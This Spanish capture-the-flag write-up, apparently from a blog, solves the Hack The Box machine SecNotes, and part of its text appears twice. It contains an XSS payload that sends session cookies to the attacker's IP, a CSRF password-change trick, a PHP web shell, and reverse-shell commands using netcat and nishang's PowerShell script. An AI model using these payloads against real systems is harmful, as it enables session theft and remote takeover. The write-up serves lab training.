usuarios válidos. Esto sería fácil de ejecutar teniendo a mano herramientas como Wfuzz y diccionarios como SecLists, que nos provee entre tantas cosas, un diccionario dedicado a nombres de usuario comunes. sudo apt install wfuzz git clone https://github.com/danielmiessler/SecLists wfuzz -c -L -t 400 --hs &quot;No account found with that username.&quot; -w /dirección/del/diccionario/SecLists/Usernames/Names/names.txt -d &quot;username=FUZZ&amp;password=noConocemosLaContraseña&quot; http://10.10.10.97 Parámetro Explicación -c Output colorizado -L Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero -t Específicamos el número de hilos con el queremos trabajar --hs Oculta las respuestas con la expresión regular que indiquemos, en este caso controlamos el mensaje de error -w Especificamos el diccionario con el que queremos trabajar -d Especificamos la petición por POST En caso de que aplicasemos fuerza bruta sobre este campo, descubriríamos que el usuario tyler existe dentro del sistema, por lo que ahora tendríamos que aplicar fuerza bruta sobre el campo Password, para lo cual ya no tendremos tanta suerte, ya que como veremos más adelante, su contraseña es bastante robusta, por lo que no es suceptible a ataques por diccionario. Respecto a la segunda página no hay prácticamente nada que podamos hacer, por el momento, al menos. Fase De Explotación La máquina SecNotes cuenta con dos vías potenciales para realizar la intrusión, una vía Inyecciones SQL y otra vía CSRF (Cross-Site Request Forgery). Cross-Site Request Forgery En vista de que las credenciales por defecto no funcionaron, podemos hacer lo que haría un usuario normal, registrarnos, no todo se trata de romper. Una vez hemos creado una cuenta, podemos logearnos, y veremos un panel bastante sencillo, pero donde destaca un nombre, tyler, un posible usuario potencial, que como mencioné antes, podíamos haberlo descubierto por fuerza bruta. Por otra parte, vemos que la página nos permite crear una serie de notas, hagámoslo. Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario. Intentemos ya algo no intencionado como una inyección HTML. En el campo Title podemos escribir cualquier cosa, aunque perfectamente podría ser la inyección, y en el campo Note, colocaremos lo siguiente: &lt;h1&gt;Una frase cualquiera&lt;/h1&gt; De este modo el texto que introduzcamos cambiará su formato al de header 1. O por ejemplo, podemos hacer que nuestro texto se desplace: &lt;marquee&gt;Una frase cualquiera&lt;/marquee&gt; Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un XSS (Cross-Site Scripting)? Igual que antes, en el campo Title podemos escribir cualquier cosa, y en el campo Note, colocaremos lo siguiente: &lt;script&gt;alert(&quot;Una frase cualquiera&quot;)&lt;/script&gt; Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente. ¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión? &lt;script&gt;alert(document.cookie)&lt;/script&gt; Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), podemos empezar a esbozar una posible vía potencial para la intrusión. Podemos intentar efectuar un Cookie Hijacking, ya que secuestrando la cookie de sesión de otro usuario, si este tiene su sesión abierta, podríamos ‘logearnos’ sin proporcionar credenciales, únicamente el valor de su cookie. Adicionalmente, tenemos que pensar en una forma de obtener el valor de la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando están en su panel de inicio, además de que llaman bastante la atención. Para ello, haremos uso de un Blind XSS. Empezaremos por crear un servidor con Python, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio. sudo python3 -m http.server 80 A continuación, crearemos una nota con el siguiente mensaje: &lt;script&gt;document.write(&#39;&lt;img src=&quot;http://nuestraDirecciónIP:80/cookie=&#39; + document.cookie + &#39;&quot;&gt;&#39;)&lt;/script&gt; En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está. Por obvias razones no existen más clientes que interactuen con el servidor web, a excepción de uno. Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con tyler a través del botón Contact Us; así que lo primero que haremos sera comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina. Es importante mencionar que no podemos ocultar nuestro url con href, acortadores, iframe o algún otro método, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido. Sin cerrar nuestro servidor hosteado con Python, a través del botón Contact Us, enviaremos el siguiente mensaje para confirmar si tyler lee nuestros mensajes: http://nuestraDirecciónIP:80/tylerEstáPresente Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje: &lt;script&gt;document.write(&#39;&lt;img src=&quot;http://nuestraDirecciónIP:80/cookie=&#39; + document.cookie + &#39;&quot;&gt;&#39;)&lt;/script&gt; Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa. Investigando un poco más la página web, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos. Adicionalmente, si revisamos esta petición con Burp Suite, nos daremos cuenta que no existe algún tipo de CSRF Token, por lo que en principio, podríamos modificar esta petición a nuestro antojo. Lo que haremos será cambiar esta petición que se está tramitando por POST, a GET. De modo que no haya que proporcionar los campos Password y Confirm Password de forma manual, los proporcionaremos a través de la propia URL. Para ello, desde Burp Suite, habiendo capturado la petición del cambio de contraseña, simplemente haremos click derecho, Change request method, y copiaremos la nueva petición por GET. De esta manera, si añadimos http://10.10.10.97 al inicio de la petición que acabamos de copiar, generaremos un URL capaz de cambiar contraseñas a través del método GET; probémoslo. Posteriormente, proseguiremos a logearnos con la contraseña que establecimos en el URL. Ya una vez dentro, encontraremos una nota, con lo que parece ser un usuario y contraseña para un recurso compartido; si recordamos de nuestro escaneo con Nmap, el puerto 445 estaba abierto. SQL Injection Otro vector a considerar al encontrarnos frente a un panel de login sería probar Inyecciones SQL con las cuales bypassear el panel. Al igual que cuando aplicamos fuerza bruta sobre el campo Username, podemos ayudarnos de un diccionario como el mismo SecLists, el cual contiene una buena cantidad de expresiones que podemos probar. Habiendo bypasseado el panel de login llegaremos igualmente a las credenciales del recurso compartido a nivel de red, con la diferencia que tenemos acceso a las notas de todos los usuarios, no únicamente tyler. Independientemente de como nos hayamos hecho con las credenciales, podemos empezar a analizar el recurso con SMBMap. smbmap -H 10.10.10.97 -u &#39;tyler&#39; -p &#39;92g!mA8BGj0irkL%0G*&amp;&#39; Podemos observar que tenemos permiso de lectura y escritura sobre el recurso new-site, echemos un vistazo de manera recursiva sobre este. smbmap -H 10.10.10.97 -u &#39;tyler&#39; -p &#39;92g!mA8BGj0irkL%0G*&amp;&#39; -R &#39;new-site&#39; A partir de este punto empezaremos a trabajar con smbclient, ya que nos resultará mucho más cómoda su interfaz de línea de comandos (CLI). Para saber de que se trata el contenido dentro del recurso new-site podemos descargarlo en nuestra máquina con el comando get, aunque podemos también intuirlo en base al nombre de los archivos, IIS. get iisstart.htm get iisstart.png Rápidamente nos daremos cuenta que estamos frente al contenido de la segunda página web, alojada en el puerto 8808; por lo que, dada nuestra capacidad de escritura sobre el recurso, deberíamos de poder subir contenido que se vea reflejado en el servidor web. Empecemos por subir algo simple como una web shell. &lt;?php echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST[&#39;cmd&#39;]) . &quot;&lt;/pre&gt;&quot;; ?&gt; put cmd.php Una vez subida, desde nuestro navegador, podemos acceder a ella añadiendo /cmd.php?cmd=comando al url. Podemos ejecutar ipconfig para corroborar que nos encontramos dentro de la máquina víctima. O whoami para determinar que usuario somos. Ya a partir de este punto, lo que nos interesa como atacantes, es ganar acceso al sistema a través de una consola propiamente, para lo cual tenemos dos opciones: Podemos usar Netcat, para lo cual descargaremos la última versión, subiremos al servidor web la versión compilada para 64 bits. put nc64.exe Nos pondremos en escucha a través del puerto que determinemos. sudo rlwrap nc -nlvp &lt;puertoCualquiera&gt; Para finalmente a través del navegador añadir lo siguiente al url. /cmd.php?cmd=nc64.exe -e cmd &lt;nuestraDirecciónIP&gt; &lt;puertoCualquiera&gt; O por su parte podemos usar Invoke-PowerShellTcp de nishang, para lo cual descargaremos el script. wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 Añadimos lo siguiente al final del script. Invoke-PowerShellTcp -Reverse -IPAddress &lt;nuestraDirecciónIP&gt; -Port &lt;puertoCualquiera&gt; Lo subimos al servidor web. put Invoke-PowerShellTcp.ps1 Nos ponemos en escucha a través del puerto que determinamos anteriormente. sudo rlwrap nc -nlvp &lt;puertoCualquiera&gt; Para finalmente a través del navegador añadir lo siguiente al url. /cmd.php?cmd=powershell -ep bypass .\\Invoke-PowerShellTcp Escalada De Privilegios","headline":"SecNotes - Hack The Box","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8080/SecNotes-Hack-The-Box"},"url":"http://localhost:8080/SecNotes-Hack-The-Box"}</script>
<!-- End Jekyll SEO tag -->

</head>


<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1 class="glitch-header">filthyHacker@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/"><h2 class="header-link">Posts</h2></a>
<a href="/buscar"><h2 class="header-link">Buscar</h2></a>
<a href="/archivo"><h2 class="header-link">Archivo</h2></a>
<a href="/en"><h2 class="header-link">English</h2></a>

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <h2>SecNotes - Hack The Box</h2>
  <time datetime="2022-02-28T00:00:00-05:00" class="by-line">28/02/2022</time>
  <p>En esta ocasión vamos a estar resolviendo la máquina <em>SecNotes</em> de <em>Hack The Box</em>. Es una máquina <em>Windows</em> de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la máquina está activa.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.97
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/2.png" alt="" /></p>

<p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">127</code>, por lo que podemos intuir que estamos ante una máquina <em>Windows</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Sistema Operativo (OS)</th>
      <th style="text-align: left">TTL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Linux</td>
      <td style="text-align: left">64</td>
    </tr>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">128</td>
    </tr>
    <tr>
      <td style="text-align: left">Solaris</td>
      <td style="text-align: left">254</td>
    </tr>
  </tbody>
</table>

<p>Si nos damos cuenta, en esta ocasión, el valor del <em>TTL</em> es <code class="language-plaintext highlighter-rouge">127</code> y no <code class="language-plaintext highlighter-rouge">128</code> como indica la tabla anterior, esto se debe a que en el entorno de máquinas de <em>Hack The Box</em>, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el <em>TTL</em> disminuye en una unidad.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.97 -R
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/3.png" alt="" /></p>

<p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.97
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.97
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parámetro</th>
      <th style="text-align: left">Explicación</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-p-</td>
      <td style="text-align: left">Escanea todo el rango de puertos (65535 en total)</td>
    </tr>
    <tr>
      <td style="text-align: left">--open</td>
      <td style="text-align: left">Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</td>
    </tr>
    <tr>
      <td style="text-align: left">-T5</td>
      <td style="text-align: left">La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></td>
    </tr>
    <tr>
      <td style="text-align: left">-v</td>
      <td style="text-align: left"><em>Verbose</em>, reporta lo encontrado por consola</td>
    </tr>
    <tr>
      <td style="text-align: left">-n</td>
      <td style="text-align: left">No aplicar <em>resolución DNS</em></td>
    </tr>
    <tr>
      <td style="text-align: left">-sS</td>
      <td style="text-align: left">Escaneo <em>TCP SYN</em></td>
    </tr>
    <tr>
      <td style="text-align: left">-min-rate</td>
      <td style="text-align: left">Emitir paquetes no más lentos que &lt;valor&gt; por segundo</td>
    </tr>
    <tr>
      <td style="text-align: left">-vvv</td>
      <td style="text-align: left">Triple <em>verbose</em>, para obtener mayor información por consola</td>
    </tr>
    <tr>
      <td style="text-align: left">-Pn</td>
      <td style="text-align: left">No aplicar <em>host discovery</em></td>
    </tr>
  </tbody>
</table>

<p>Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 80,445,8808 10.10.10.97
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parámetro</th>
      <th style="text-align: left">Explicación</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-sC</td>
      <td style="text-align: left">Scripts básicos de enumeración</td>
    </tr>
    <tr>
      <td style="text-align: left">-sV</td>
      <td style="text-align: left">Versión y servicios que corren bajo los puertos encontrados</td>
    </tr>
    <tr>
      <td style="text-align: left">-p</td>
      <td style="text-align: left">Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</td>
    </tr>
  </tbody>
</table>

<p>Basándonos en la información que nos reporta <em>Nmap</em>, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con <code class="language-plaintext highlighter-rouge">HTTP</code>, así como con <code class="language-plaintext highlighter-rouge">SMB</code> (Server Message Block).</p>

<p>Empezando por el puerto <code class="language-plaintext highlighter-rouge">80</code> y <code class="language-plaintext highlighter-rouge">8808</code> podemos ver que ambas páginas están montadas sobre <code class="language-plaintext highlighter-rouge">IIS</code> (Internet Information Services), un servidor web para <em>Microsft Windows</em>.</p>

<p>Echemos un vistazo desde <code class="language-plaintext highlighter-rouge">WhatWeb</code>, una herramienta que se encarga de identificar las tecnologías web que se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.97
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.97:8808
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/4.png" alt="" /></p>

<p>No hay nada que llame especialmente nuestra atención, más que el redireccionamiento que realiza la primera página hacia lo que parece ser un panel de login, y el título de la segunda página web que es el que viene por defecto al montarla con <code class="language-plaintext highlighter-rouge">IIS</code>.</p>

<p>En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/5.png" alt="" /></p>

<p>Lo primero que nos puede venir a la mente al ver un panel de login, sería probar credenciales por defecto, sin embargo este no va a ser el caso.</p>

<p>Algo interesante que voy a comentar solo como curiosidad, es que si ingresamos un nombre de usuario que no existe en el sistema, la página nos devolverá el siguiente mensaje.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/6.png" alt="" /></p>

<p>Algo que resulta crítico, ya que teniendo control sobre este mensaje, podemos aplicar fuerza bruta sobre el campo <code class="language-plaintext highlighter-rouge">Username</code> para descubrir usuarios válidos.</p>

<p>Esto sería fácil de ejecutar teniendo a mano herramientas como <code class="language-plaintext highlighter-rouge">Wfuzz</code> y diccionarios como <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt">SecLists</a>, que nos provee entre tantas cosas, un diccionario dedicado a nombres de usuario comunes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install wfuzz
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/danielmiessler/SecLists
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">-L</span> <span class="nt">-t</span> 400 <span class="nt">--hs</span> <span class="s2">"No account found with that username."</span> <span class="nt">-w</span> /dirección/del/diccionario/SecLists/Usernames/Names/names.txt <span class="nt">-d</span> <span class="s2">"username=FUZZ&amp;password=noConocemosLaContraseña"</span> http://10.10.10.97
</code></pre></div></div>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Parámetro</th>
      <th style="text-align: left">Explicación</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">-c</td>
      <td style="text-align: left">Output colorizado</td>
    </tr>
    <tr>
      <td style="text-align: left">-L</td>
      <td style="text-align: left">Sigue las redirecciones HTTP, de modo que conseguimos el código de estado final verdadero</td>
    </tr>
    <tr>
      <td style="text-align: left">-t</td>
      <td style="text-align: left">Específicamos el número de hilos con el queremos trabajar</td>
    </tr>
    <tr>
      <td style="text-align: left">--hs</td>
      <td style="text-align: left">Oculta las respuestas con la expresión regular que indiquemos, en este caso controlamos el mensaje de  error</td>
    </tr>
    <tr>
      <td style="text-align: left">-w</td>
      <td style="text-align: left">Especificamos el diccionario con el que queremos trabajar</td>
    </tr>
    <tr>
      <td style="text-align: left">-d</td>
      <td style="text-align: left">Especificamos la petición por POST</td>
    </tr>
  </tbody>
</table>

<p>En caso de que aplicasemos fuerza bruta sobre este campo, descubriríamos que el usuario <code class="language-plaintext highlighter-rouge">tyler</code> existe dentro del sistema, por lo que ahora tendríamos que aplicar fuerza bruta sobre el campo <code class="language-plaintext highlighter-rouge">Password</code>, para lo cual ya no tendremos tanta suerte, ya que como veremos más adelante, su contraseña es bastante robusta, por lo que no es suceptible a ataques por diccionario.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/7.png" alt="" /></p>

<p>Respecto a la segunda página no hay prácticamente nada que podamos hacer, por el momento, al menos.</p>

<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>

<p>La máquina <em>SecNotes</em> cuenta con dos vías potenciales para realizar la intrusión, una vía <a href="https://mateonitro550.github.io/SQL-Injection">Inyecciones SQL</a> y otra vía <a href="https://mateonitro550.github.io/Cross-Site-Request-Forgery-(CSRF)">CSRF</a> (Cross-Site Request Forgery).</p>

<h3 id="cross-site-request-forgery"><a href="#header-3"></a>Cross-Site Request Forgery</h3>

<p>En vista de que las credenciales por defecto no funcionaron, podemos hacer lo que haría un usuario normal, registrarnos, no todo se trata de romper.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/8.png" alt="" /></p>

<p>Una vez hemos creado una cuenta, podemos logearnos, y veremos un panel bastante sencillo, pero donde destaca un nombre, <code class="language-plaintext highlighter-rouge">tyler</code>, un posible usuario potencial, que como mencioné antes, podíamos haberlo descubierto por fuerza bruta.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/9.png" alt="" /></p>

<p>Por otra parte, vemos que la página nos permite crear una serie de notas, hagámoslo.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/10.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/11.png" alt="" /></p>

<p>Vemos que el mecanismo de la página es bastante simple, pero si durante el desarrollo de la misma, no se tuvo en consideración ningún tipo de seguridad, quizá esta sea vulnerable a algo tan básico como confiar plenamente en el input del usuario.</p>

<p>Intentemos ya algo no intencionado como una <a href="https://mateonitro550.github.io/HTML-Injection">inyección HTML</a>.</p>

<p>En el campo <em>Title</em> podemos escribir cualquier cosa, aunque perfectamente podría ser la inyección, y en el campo <em>Note</em>, colocaremos lo siguiente:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h1&gt;</span>Una frase cualquiera<span class="nt">&lt;/h1&gt;</span>
</code></pre></div></div>

<p>De este modo el texto que introduzcamos cambiará su formato al de <em>header 1</em>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/12.png" alt="" /></p>

<p>O por ejemplo, podemos hacer que nuestro texto se desplace:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;marquee&gt;</span>Una frase cualquiera<span class="nt">&lt;/marquee&gt;</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/13.png" alt="" /></p>

<p>Vemos que como atacantes, tenemos la capacidad de inyectar código al propio código fuente de la página web. ¿Qué tal si probamos ahora un <a href="https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">XSS</a> (Cross-Site Scripting)?</p>

<p>Igual que antes, en el campo <em>Title</em> podemos escribir cualquier cosa, y en el campo <em>Note</em>, colocaremos lo siguiente:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Una frase cualquiera</span><span class="dl">"</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>Podemos observar que cada vez que la página web se recarga, aparece un mensaje con el texto que indicamos anteriormente.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/14.png" alt="" /></p>

<p>¿Qué tal si en vez de mostrar por pantalla una frase cualquiera, listamos mejor información relevante como la cookie de sesión?</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/15.png" alt="" /></p>

<p>Una vez comprobamos que tenemos la capacidad de visualizar nuestra propia cookie de sesión a través de ventanas emergentes (pop-ups), podemos empezar a esbozar una posible vía potencial para la intrusión.</p>

<p>Podemos intentar efectuar un <code class="language-plaintext highlighter-rouge">Cookie Hijacking</code>, ya que secuestrando la cookie de sesión de otro usuario, si este tiene su sesión abierta, podríamos ‘logearnos’ sin proporcionar credenciales, únicamente el valor de su cookie.</p>

<p>Adicionalmente, tenemos que pensar en una forma de obtener el valor de la cookie directamente en nuestro equipo de atacantes, ya que de momento, estas ventanas solo son visibles por los usuarios cuando están en su panel de inicio, además de que llaman bastante la atención. Para ello, haremos uso de un <a href="https://mateonitro550.github.io/https://mateonitro550.github.io/Cross-Site-Scripting-(XSS)">Blind XSS</a>.</p>

<p>Empezaremos por crear un servidor con <code class="language-plaintext highlighter-rouge">Python</code>, en el cual recibiremos las cookies de los usuarios cada que estos refresquen, o se encuentren en su panel de inicio.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>A continuación, crearemos una nota con el siguiente mensaje:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://nuestraDirecciónIP:80/cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/16.png" alt="" /></p>

<p>En vista de que recibimos nuestra propia cookie de sesión directamente en nuestro equipo, sería solo cuestión de tiempo para hacernos con las cookies de otros usuarios, si los existiera, claro está.</p>

<p>Por obvias razones no existen más clientes que interactuen con el servidor web, a excepción de uno. Si recordamos, el mensaje inicial que aparecía en la página, mencionaba que nos pongamos en contacto con <code class="language-plaintext highlighter-rouge">tyler</code> a través del botón <em>Contact Us</em>; así que lo primero que haremos sera  comprobar si este lee nuestros mensajes, para ello le enviaremos un url que apunte a nuestra máquina.</p>

<p>Es importante mencionar que no podemos ocultar nuestro url con <em>href</em>, <em>acortadores</em>, <em>iframe</em> o algún otro método, ya que al ser un usuario simulado, este no lo gestiona muy bien. Por su parte, un usuario real, a no ser a que tenga nulos conocimientos de seguridad informática, abriría un enlace que le envía un total desconocido.</p>

<p>Sin cerrar nuestro servidor hosteado con <code class="language-plaintext highlighter-rouge">Python</code>, a través del botón <em>Contact Us</em>, enviaremos el siguiente mensaje para confirmar si <code class="language-plaintext highlighter-rouge">tyler</code> lee nuestros mensajes:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://nuestraDirecciónIP:80/tylerEstáPresente
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/17.png" alt="" /></p>

<p>Vemos que conseguimos una petición por GET por parte de la máquina víctima, por lo que asumimos que este lee nuestros mensajes. Ya con esto podemos pensar que tenemos una posible vía potencial para hacernos con la cookie del usuario. Por lo cual, enviaremos el siguiente mensaje:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src="http://nuestraDirecciónIP:80/cookie=</span><span class="dl">'</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">"&gt;</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/18.png" alt="" /></p>

<p>Para nuestra sorpresa, esto no funciona, así que tendremos que buscar otra alternativa.</p>

<p>Investigando un poco más la página web, si decidimos cambiar nuestra contraseña, nos daremos cuenta que la página no nos solicita nuestra contraseña anterior, o algún otro método de verificación en dos pasos.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2022-02-28-SecNotes-Hack-The-Box/19.png" alt="" /></p>

<p>Adicionalmente, si revisamos esta petición con <code class="language-plaintext highlighter-rouge">Burp Suite</code>, nos daremos cuenta que no existe algún tipo de <a href="https://portswigger.net/web-security/csrf/tokens">CSRF Token</a>, por lo que en principio, podríamos modificar esta petición a nuestro antojo.</p>

